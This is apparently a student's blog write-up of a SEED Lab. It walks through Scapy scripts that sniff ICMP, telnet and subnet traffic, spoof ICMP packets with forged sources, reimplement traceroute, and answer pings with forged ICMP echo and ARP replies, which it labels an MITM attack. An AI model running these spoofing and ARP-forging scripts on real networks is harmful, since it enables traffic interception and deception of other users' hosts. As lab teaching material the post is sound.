---
layout: post
title: Packet Sniffing and Spoofing
categories: [scapy, wireshark, sniffing]
---

In networking, a packet is the basic unit of data. Every data sent across the network is usually done as a packet. This means that if an adversary can gain access to a packet, such an adversary can launch sophisticated attacks.

In this post, I aim to document my findings and observations while performing a SEED Lab.

<br>

### Tools used in this lab
- _Scapy: scapy is a very powerful tool written in Python for packet manipulation_

<br>

A sniffer’s job is usually to monitor traffic flow in a particular network. For a sniffer to do this, it has to attach itself to a network interface (i.e. listen to connections to and from the network that particular NIC is connected to).

Normally, when packets arrive, the NIC discards any packet not meant for it and forwards only the packets meant for it to the kernel and the kernel passes on the packets to the required programs.
For a sniffer to achieve its full potential, it has to be able to get access to all packets that flow across the network the NIC is connected to irrespective of whether the packets are meant for the NIC or not.

To achieve this, the sniffer needs a way to tell the NIC “Hey NIC, please forward all packets you receive to the kernel. Thanks.” It does this by setting the NIC to promiscuous mode.
With the NIC set to promiscuous mode, the NIC rather than discarding packets not meant for it, forwards it to the kernel which in turn passes the packets to the sniffer program.

Imagine if anybody could just set the network interface card to promiscuous mode! To guard against abuse, you need to have the highest permissions the kernel provides which are Administrator in Windows and root in Unix/Linux.

It is also worth noting that sniffer programs during their operation would make some library calls. These calls are essential to the correct functioning of these programs. (Basically, a library call is when a program tries to access the functions written in another program - called a library).
One such library is libpcap.

Usually, the sniffer program would make library calls to do the following:
- determine the network interface to sniff on
- start sniffing on the network interface
- apply BSD packet filters (BPF) to limit sniffing to only traffic we’re interested in
- stop the sniffing 

<br>

### Capture only the ICMP packet
Specific packets can usually be captured. The reason to do this would be when you are interested in seeing only one type of traffic. In this case, the type of traffic we are interested in is `ICMP`.

Achieving this with scapy is quite straight forward and can be accomplished by the below code

```python
#!/usr/bin/env python3
import sys
from scapy.all import *

def print_pkt(pkt):
    return pkt.summary()

def main():
    # Ensure correct usage
    if len(sys.argv) != 2:
        sys.exit('Usage: ./sniffer.py <INTERFACE>')
    # main
    iface_ = sys.argv[1]
    print(f'listening on {iface_}')
    sniff(iface=iface_, filter='icmp', prn=print_pkt)
    
if __name__ == '__main__':
    main()
```
This is a simple program whose only purpose is to sniff `ICMP` traffic. During usage, you get to specify the `interface` you want to sniff traffic on.

***host***

![1-icmp-ping](https://github.com/iukadike/blog/assets/58455326/1a9b864e-d77d-444b-a811-615c3d382b51)

***sniffer program***

![1-icmp-sniff](https://github.com/iukadike/blog/assets/58455326/cd847e77-59b2-4747-8399-d1f57ef10439)

<br>

### Capture any TCP packet that comes from a particular IP and with a destination port number 23.
As with capturing traffic from a specific protocol, you can also capture specific traffic moving from a particular host to a specific service like `telnet`.

Achieving this with scapy is quite straight forward and can be accomplished by the below code

```python
#!/usr/bin/env python3
import sys
from scapy.all import *

def print_pkt(pkt):
    return pkt.summary()

def main():
    # Ensure correct usage
    if len(sys.argv) != 4:
        sys.exit('Usage: ./sniffer.py <INTERFACE> <IP-ADDRESS> <PORT>')
    # main
    iface_ = sys.argv[1]
    s_addr = sys.argv[2]
    d_port = sys.argv[3]
    print(f'listening on {iface_}')
    sniff(iface=iface_, filter=f'(src host {s_addr}) && (tcp dst port {d_port})', prn=print_pkt)
    
if __name__ == '__main__':
    main()
```
During usage, you get to specify the `interface` you want to sniff traffic on, the `IP address` that you want to sniff on, and the `service` you want to monitor

<br>

### Capture packets that come from or go to a particular subnet. You should not pick the subnet that your VM is attached to.
The idea behind sniffing subnets rather than a particular host is that you can monitor every host that is a part of the subnet. This makes analysis easier as later on you can filter for specific hosts.

Achieving this with scapy is quite straight forward and can be accomplished by the below code

```python
#!/usr/bin/env python3
import sys
from scapy.all import *

def print_pkt(pkt):
    return pkt.summary()

def main():
    # Ensure correct usage
    if len(sys.argv) != 3:
        sys.exit('Usage: ./sniffer.py <INTERFACE> <SUBNET>')
    # main
    iface_ = sys.argv[1]
    net_ = sys.argv[2]
    print(f'listening on {iface_}')
    sniff(iface=iface_, filter=f'net {net_}', prn=print_pkt)
    
if __name__ == '__main__':
    main()
```
During usage, you get to specify the `interface` you want to sniff traffic on and the `network address` that you want to monitor

<br>

### Spoofing ICMP Packets
The above codes have all dealt with capturing packets. It is also possible to generate arbitrary packets and send them to a host over the network. This usually involves knowing how the network stack works because you will have to manually build these stacks.

For this lab, I attempt to spoof an ICMP packet and send it to a host.

```python
#!/usr/bin/env python3
import sys
from scapy.all import *
from time import sleep

def main():
    # Ensure correct usage
    if len(sys.argv) != 3:
        sys.exit('Usage: ./spoofer.py <SOURCE-ADDRESS> <DESTINATION-ADDRESS>')
    
    # main
    s_addr = sys.argv[1]
    d_addr = sys.argv[2]
    
    # Loop to continuosly send the packet
    while True:
        send(IP(src=s_addr, dst=d_addr)/ICMP())
        sleep(5)

    
if __name__ == '__main__':
    main()
```

***icmp spoofing program***

![2-icmp-spoof](https://github.com/iukadike/blog/assets/58455326/6233a53d-ff11-4e5a-b298-2130d1960022)

***icmp spoofing wireshark***

![2-icmp-wireshark](https://github.com/iukadike/blog/assets/58455326/e1af5056-b4ef-4b3c-9e42-c5986f16bc5a)

During usage, you get to specify the `source address` you want your ping requests to appear to come from and the `destination address` that you want to ping. For PoC, I ran the program with `source address` as `8.8.8.8` and `destination address` as my VM. I opened up Wireshark and began sniffing. I noticed that my VM receives the `echo request` and sends an `echo reply` to `8.8.8.8`.

This leads me to wonder, "What happens when a machine receives unsolicited `echo replies`?"

<br>

### Traceroute
What better way to understand how traceroute works, than to implement your own version of traceroute.

```python
#!/usr/bin/env python3
import sys, os
from scapy.all import *

MAX_TTL = 64

def send_(dst_, ttl_):
    return sr1(IP(dst=dst_, ttl=ttl_)/ICMP(), timeout=1, verbose=0)
    
def result_(hops, dst_):
    print("\n", "*"*3, f"It took {hops} hops to get to {dst_}", "*"*3, "\n")
    
def main():
    # Ensure correct usage
    if len(sys.argv) != 2:
        sys.exit("Usage: ./traceroute.py IP-ADDRESS")
        
    # Set the variables
    dst_ = sys.argv[1]
    ttl_ = 0
    hops = 0
    
    # Loop till you get to the host
    while True:
        ttl_ += 1
        rcv = send_(dst_, ttl_)
        
        if rcv is None:
            hops += 1
            print("--> * * * * *")
            if hops >= MAX_TTL:
                os.system('clear')
                sys.exit(f"Failed to connect to {dst_}. Maybe host is offline?")
        elif rcv[ICMP].type == 3:
            sys.exit("Destination host is unreachable")
        elif rcv[ICMP].type == 11:
            hops += 1
            print(rcv.sprintf("--> %IP.src%"))
        elif rcv[ICMP].type == 0:
            hops += 1
            print(rcv.sprintf("--> %IP.src%"))
            break
    
    result_(hops, dst_)
       
            
if __name__ == '__main__':
    main()
```
This program works by sending `ICMP` packets with the `ttl` set initially to 1. The idea is that if the packet is yet to get to the destination host and the `TTL` gets to zero, the route (the machine in between the sender and the host) sends back a `TTL exceeded message`. This is how we get to know how many machines are between us and our destination. Furthermore, not all hosts in the route respond, so we have to skip some hosts during our probe.

***traceroute to `1.1.1.1`***

![3-traceroute-1 1 1 1](https://github.com/iukadike/blog/assets/58455326/151dd547-65f4-4687-b9a7-7912f6e13a8b)

***traceroute to `8.8.8.8`***

![3-traceroute-8 8 8 8](https://github.com/iukadike/blog/assets/58455326/8e3864e7-d31c-48e8-89bf-13e837012c2a)

I noticed that regardless of the host I ping, some addresses in the routes remain the same. This is true for the beginning of the route. This happens because the packets all pass through my VM gateway and ISP gateway which is constant.

<br>

### Sniffing and then Spoofing
When sniffing is combined with spoofing, things get interesting because you can intercept a packet, modify it and send it out as though nothing happened. This happens seamlessly and will not be noticed by an average user.

```
context
host A: 10.9.0.5
host B: 10.9.0.6
VM: 10.9.0.1 and 10.0.2.4
the sniffing happens on the VM` while `the ping happens on host B
```

Achieving this with scapy is quite straightforward and can be accomplished by the below code

```python
#!/usr/bin/env python3
import sys
from scapy.all import *

def main():
    if len(sys.argv) != 2:
        sys.exit("Usage: ./sniff_spoof.py <INTERFACE>")
    
    iface_ = sys.argv[1]
    print(f'listening for packets on {iface_}')
    sniff(iface = iface_, filter = 'icmp', prn = sniff_)
    
def sniff_(pkt):
    if pkt[ICMP].type == 8:
        ip = IP(src = pkt[IP].dst, dst = pkt[IP].src, ihl = pkt[IP].ihl)
        icmp = ICMP(type = 0, id = pkt[ICMP].id, seq = pkt[ICMP].seq)
        data = pkt[Raw].load
        send(ip/icmp/data, verbose=0)
    elif pkt[ICMP].type == 0:
        print(pkt.sprintf("%IP.src% -> %IP.dst%"))
        
        
if __name__ == '__main__':
    main()
```
This program's only purpose is to listen for `ICMP echo requests` and send an `ICMP echo reply` regardless of whether the destination host is online or not. During usage, you get to specify the `interface` on which you want to monitor.

Running the program against various hosts, I came across the following observations:
- when pinging `1.2.3.4`, _a non-existing host on the Internet_, the program responds to these requests with an `echo reply` even though the host is non-existent. Because of this, the _non-existent host_ appears to be online. When viewing the traffic in Wireshark, `host B` uses the default route `10.9.0.1` to send out the packet. When the packet gets to `10.9.0.1`, it also uses its default route `10.0.2.1` to send out the traffic.
  - ![4 1-ping-1 2 3 4](https://github.com/iukadike/blog/assets/58455326/94f4ed7d-7fac-4fd6-b696-370be194848c)
  - ![4 1-sniff-spoof-1 2 3 4](https://github.com/iukadike/blog/assets/58455326/ad669824-2e71-4309-9647-fd20c3ffeedc)
  - ![4 1-wireshark-1 2 3 4](https://github.com/iukadike/blog/assets/58455326/5eff7286-a1e9-4213-a6b8-24f4fe68e16b)

- when pinging `10.9.0.99`, _a non-existing host on the LAN_, the program seems not to respond to these requests with an `echo reply` even though the program is listening for traffic. When the traffic is viewed via Wireshark, the result is the same - Wireshark doesn't see any traffic. Maybe I'm doing something wrong? `see the extra section for my additional findings` [extra findings](/2023-06-06-packet-sniffing-and-spoofing-lab.md#extra-findings)
  - ![4 2-ping-10 9 0 99](https://github.com/iukadike/blog/assets/58455326/b92ee6fd-cf9c-45f9-a6a9-4808e9efa2d5)
  - ![4 2-sniff-spoof-10 9 0 99](https://github.com/iukadike/blog/assets/58455326/2acbaf2c-d101-4e20-b364-8f4599eb94e1)
  - ![4 2-wireshark-10 9 0 99](https://github.com/iukadike/blog/assets/58455326/6fc829cd-23b4-4d48-b787-d94475cbd20c)

- when pinging `10.9.0.5`, _an existing host on the LAN_, the program responds to these requests with an `echo reply`, so also the `10.9.0.5` host. This means that two `echo replies` are sent. This can be observed from the host the ping was sent from. When the reply comes back, one is marked as a duplicate. This further adds to my confusion as to why the program did not work for `10.9.0.99`. `see the extra section for my additional findings` [extra findings](/2023-06-06-packet-sniffing-and-spoofing-lab.md#extra-findings)
  - ![4 3-ping-10 9 0 5](https://github.com/iukadike/blog/assets/58455326/0dd30563-4c5c-4a19-b75e-f760c9fd6b13)
  - ![4 3-sniff-spoof-10 9 0 5](https://github.com/iukadike/blog/assets/58455326/e04544b9-78d1-47cb-908b-983784551d67)
  - ![4 3-wireshark-10 9 0 5](https://github.com/iukadike/blog/assets/58455326/49738083-344f-4e84-b664-296781518506)

- when pinging `8.8.8.8`, _an existing host on the Internet_, the program responds to these requests with an `echo reply`, so also the `8.8.8.8` host. This means that two `echo replies` are sent. This can be observed from the host the ping was sent from. When the reply comes back, one is marked as a duplicate. There is an `ARP` request from the `host` to know the `MAC address` of the gateway.
  - ![4 4-ping-8 8 8 8](https://github.com/iukadike/blog/assets/58455326/b6aec9ca-8087-4472-a602-371acd92593e)
  - ![4 4-sniff-spoof-8 8 8 8](https://github.com/iukadike/blog/assets/58455326/10f6442d-e463-43ee-b237-285ea47002bc)
  - ![4 4-wireshark-8 8 8 8](https://github.com/iukadike/blog/assets/58455326/ac6a4145-0df9-48e4-a0e3-1da80e9bbe02)

I also noticed that after sniffing the packet and spoofing it, if I do not use the original data payload that comes with the sniffed packet, the ping program does not get to see the reply I send. However, by spoofing the packet and using the raw packet data payload that comes with the sniffed packet, the ping program sees the reply.
___
##### Extra Findings
After doing some extra digging and testing, I discovered that when `host B` needs to send `ICMP echo requests` to any host on the same LAN, it sends `ARP Requests` to every host on the LAN. This is so because it needs to know the `MAC address` of the destination before sending. This can be seen when observing traffic from Wireshark.

Initially, when I ran the command, I noticed the `ARP requests` in Wireshark, but there was no corresponding `ARP reply` because the host is non-existent/offline. To fix this, I modified my Python code to sniff for `ARP requests` and spoof `ARP replies`. This ended up being the solution as now pinging `10.9.0.99`, my program responds to the request and the reply can be observed from `host B`.

Below is the modified program

```python
#!/usr/bin/env python3
import sys
from scapy.all import *

def main():
    if len(sys.argv) != 2:
        sys.exit("Usage: ./sniff_spoof.py <INTERFACE>")
    
    iface_ = sys.argv[1]
    print(f'listening for packets on {iface_}')
    sniff(iface = iface_, filter = 'icmp || arp', prn = sniff_)
    
def sniff_(pkt):
    try:
        # Handle ARP packets
        if pkt[ARP].op == 1:
            arp = ARP(op = 2, hwsrc = pkt[Ether].dst, psrc = pkt[ARP].pdst, pdst = pkt[ARP].psrc)
            send(arp, verbose=0)
            print(pkt.sprintf("spoofed ARP Reply--> %ARP.pdst% -> %ARP.psrc%"))
        elif pkt[ARP].op == 2:
            print(pkt.sprintf("non-spoofed ARP Reply--> %ARP.psrc% -> %ARP.pdst%"))
    except IndexError:
        # Handle ICMP packets
        if pkt[ICMP].type == 8:
            ip = IP(src = pkt[IP].dst, dst = pkt[IP].src, ihl = pkt[IP].ihl)
            icmp = ICMP(type = 0, id = pkt[ICMP].id, seq = pkt[ICMP].seq)
            data = pkt[Raw].load
            send(ip/icmp/data, verbose=0)
        elif pkt[ICMP].type == 0:
            print(pkt.sprintf("ICMP Reply --> %IP.src% -> %IP.dst%"))
        
        
if __name__ == '__main__':
    main()        
```

***pinging host 10.9.0.99***

![4 5-ping-10 9 0 99](https://github.com/iukadike/blog/assets/58455326/3ab1f918-66c1-4031-88b2-f921ca0801a7)

***mitm attack 10.9.0.99***

![4 5-sniff-spoof-10 9 0 99](https://github.com/iukadike/blog/assets/58455326/64d47b7e-3066-4eab-be85-df01dba7b91a)

***wireshark results 10.9.0.99***

![4 5-wireshark-10 9 0 99](https://github.com/iukadike/blog/assets/58455326/a65ee2f5-5982-4345-8545-e29e5f57c66b)

<br>

_Thanks for reading._
